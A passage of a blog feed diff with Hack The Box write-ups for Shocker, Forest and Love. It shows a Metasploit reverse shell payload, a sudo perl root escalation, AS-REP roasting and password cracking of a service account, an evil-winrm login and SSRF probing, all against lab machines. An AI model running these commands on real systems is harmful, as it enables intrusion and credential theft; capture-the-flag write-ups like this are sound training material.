+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4444
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload linux/x64/shell_reverse_tcp
+
+run
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;Checking first for SUID/GUID binaries I find nothing interesting. Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; I discover that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shelly&lt;/code&gt; may run perl as root without a password. In other words, we may run arbitrary perl code as the root user. To obtains a proper interactive root shell I invoke a shell from perl.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/bash&quot;'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="htb" /><summary type="html">Shocker The Shocker box was part of the easy month on HTB. We gain initial foothold as the shelly user by exploiting the ShellShock vulnerability. We escalate to the root user by exploiting a sudoers misconfiguration that allows us to run perl as root wihtout a password.</summary></entry><entry><title type="html">Forest Write-Up</title><link href="/htb/forest" rel="alternate" type="text/html" title="Forest Write-Up" /><published>2021-07-15T15:00:00+02:00</published><updated>2021-07-15T15:00:00+02:00</updated><id>/htb/forest</id><content type="html" xml:base="/htb/forest">&lt;h1 id=&quot;forest&quot;&gt;Forest&lt;/h1&gt;
+&lt;p&gt;This machine was part of the Easy month on Hack The Box. For this machine I researched and learned a lot about active directory and the various dangerous configurations that can exist. I gain initial foothold by kerberoasting a service account. I escalate to the Administrator account by leveraging delegation permissions setup within the Active Directory to hijack an account that can dump the Administrator hash as it has the DCSync permission.&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning-and-enumeration&quot;&gt;Scanning and Enumeration&lt;/h2&gt;
+&lt;p&gt;I started with a basic NMAP scan. From the scan results we learn that our target machine is likely a Domain Controller as we can have ports for LDAP and Kerberos open.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.161    
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.161
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.027s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65511 closed ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-07-17 15:07:53Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: HTB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49706/tcp open  msrpc        Microsoft Windows RPC
+49915/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;87.95 seconds
+           Raw packets sent: 66125 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.909MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65817 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.633MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;/h2&gt;
+&lt;p&gt;I first looked into my options of attacking a DC without any valid user credentials. Turns out that there exists a flag (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do not require kerberos preauthentication&lt;/code&gt;) that can be configured on a AD account that allows us to request a TGT ticket for that AD account without providing any credentials.&lt;/p&gt;
+
+&lt;p&gt;The TGT ticket is encrypted with the Hash of the AD account. So by obtaining that ticket we can attempt to brute force the password using a dictionary.&lt;/p&gt;
+
+&lt;p&gt;To find a user that has the flag set, we would need AD credentials to search the LDAP for any such users. Since we do not have any credentials, we must guess the username.&lt;/p&gt;
+
+&lt;p&gt;I run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; to extract a list of usernames:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.161     htb.local&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
+ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-p389&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=htb,DC=local&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'dn: CN='&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1 | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'='&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 2 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.lst
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using the list of usernames I attempt to find any account with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do not require kerberos preauthentication&lt;/code&gt; account set. I discover that the svc-alfresco account is configured as such and crack its password hash using John the Ripper. I get the following credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco:s3rvice&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-GetNPUsers htb.local/ &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; users.lst &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-request-format&lt;/span&gt; john &lt;span class=&quot;nt&quot;&gt;-outputfile&lt;/span&gt; tgt-tickets.txt
+
+john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt tgt-tickets.txt
+Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5asrep, Kerberos 5 AS-REP etype 17/18/23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Will run 6 OpenMP threads
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+s3rvice          &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$krb5asrep$svc&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-alfresco&lt;/span&gt;@HTB.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:02 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-07-16 17:05&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.3649g/s 1491Kp/s 1491Kc/s 1491KC/s s4ls469..s3r2s1
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;
+&lt;p&gt;I logon to the DC using winrm and the service account credentials. Next, I upload and run BloodHound as this box is all about Active Directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'svc-alfresco'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s3rvice'&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-alfresco&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;ownloads&amp;gt; upload /home/kali/Downloads/sharphound.ps1
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-alfresco&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;ownloads&amp;gt; .&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;harphound.ps1
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-alfresco&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;ownloads&amp;gt; Invoke-Bloodhound &lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt; All &lt;span class=&quot;nt&quot;&gt;-Domain&lt;/span&gt; htb.local &lt;span class=&quot;nt&quot;&gt;-LDAPUsername&lt;/span&gt; svc-alfresco &lt;span class=&quot;nt&quot;&gt;-LDAPPassword&lt;/span&gt; s3rvice
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-alfresco&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;ownloads&amp;gt; download 20210717094745_BloodHound.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exploitig-active-directory-permissions&quot;&gt;Exploitig Active Directory Permissions&lt;/h3&gt;
+&lt;p&gt;To analyze the results of the Bloodhound script, I need to start Neo4j and then import the results in the BloodHound GUI application. Once I have done that, I can query the shortest path to Domain Admin and perform the required steps.&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">Forest This machine was part of the Easy month on Hack The Box. For this machine I researched and learned a lot about active directory and the various dangerous configurations that can exist. I gain initial foothold by kerberoasting a service account. I escalate to the Administrator account by leveraging delegation permissions setup within the Active Directory to hijack an account that can dump the Administrator hash as it has the DCSync permission.</summary></entry><entry><title type="html">Love Write-Up</title><link href="/htb/love" rel="alternate" type="text/html" title="Love Write-Up" /><published>2021-05-20T21:20:00+02:00</published><updated>2021-05-20T21:20:00+02:00</updated><id>/htb/love</id><content type="html" xml:base="/htb/love">&lt;h2 id=&quot;scanning--enumeration&quot;&gt;Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;p&gt;I started with a basic nmap scan. I continue with some simple enumeration of each port:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Port 445: Null sessions are not allowed, tested with:
+    1. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap --script &quot;safe or smb-enum-*&quot; -p 445 10.10.10.239&lt;/code&gt;
+    2. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient -U '' -N 10.10.10.239 &lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Port 3306: I am not allowed to connect from my IP Address (script output). I will revisit this when I find SSRF on the web application.&lt;/li&gt;
+  &lt;li&gt;Ports 5000, 5985,47001: HTTP 403 FORBIDDEN (script output)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/love-all &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.239
+Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-05-19 13:44 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.239
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.028s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65517 closed ports
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
+|_http-server-header: Apache/2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Voting System using PHP
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Apache/2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;staging.love.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ValentineCorp/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;m/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   NULL: 
+|_    Host &lt;span class=&quot;s1&quot;&gt;'10.10.14.204'&lt;/span&gt; is not allowed to connect to this MariaDB server
+5000/tcp  open  http         Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Apache/2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+|_ssl-date: 2021-05-19T18:21:04+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +33m10s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.91%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5/19%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;60A54E9D%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NU
+SF:LL,4B,&lt;span class=&quot;s2&quot;&gt;&quot;G&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ffj&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04Host&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20'10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;204'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20is&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20not&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20allo
+SF:wed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20to&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20connect&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20to&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20this&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20MariaDB&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20server&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+Service Info: Hosts: www.example.com, LOVE, www.love.htb&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h18m10s, deviation: 3h30m00s, median: 33m09s
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows 10 Pro 6.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   Workgroup: WORKGROUP&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-05-19T11:20:50-07:00
+| smb-security-mode: 
+|   account_used: &amp;lt;blank&amp;gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-05-19T18:20:54
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;231.22 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;enumerating-the-web-application&quot;&gt;Enumerating the Web Application&lt;/h2&gt;
+&lt;p&gt;I start with enumerating the web application on port 80 &amp;amp; 443.&lt;/p&gt;
+
+&lt;p&gt;From the nmap script output I know that there is a subdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staging.love.htb&lt;/code&gt;, so I add it to my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. The main page shows a subscription form that does not do anything, but other than that I do not find anything else interesting. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/demo&lt;/code&gt; page however has the functionality that it will download any file linked in the form.&lt;/p&gt;
+
+&lt;p&gt;I first try to use SSRF to visit pages on the localhost to see if there is anything different, but this yielded nothing at first. So in the back ground I start running gobuster to find hidden files on the main website. Meanwhile, I observe that the gopher protocol is allowed and I try to access port 3306. However I get an error that the host Love is not allowed to connect.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/love/ssrf-3306.png&quot; alt=&quot;SSRF attempt with the gopher protocol&quot; /&gt;
+&lt;em&gt;SSRF attempt with the gopher protocol.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Combining the SSRF vulnerability with the results from gobuster I start exploring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;love.htb/admin/&lt;/code&gt; section of the web application. Through exploration I discover that there is a form on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;love.htb/admin/candidates.php&lt;/code&gt; that allows adding new candidates. To add a new candidate, the form makes a POST request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;love.htb/admin/candidates_add.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://www.love.htb/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/SecLists/Discovery/Web-Content/raft-small-words.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; webroot-raft.gobuster
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.0.1
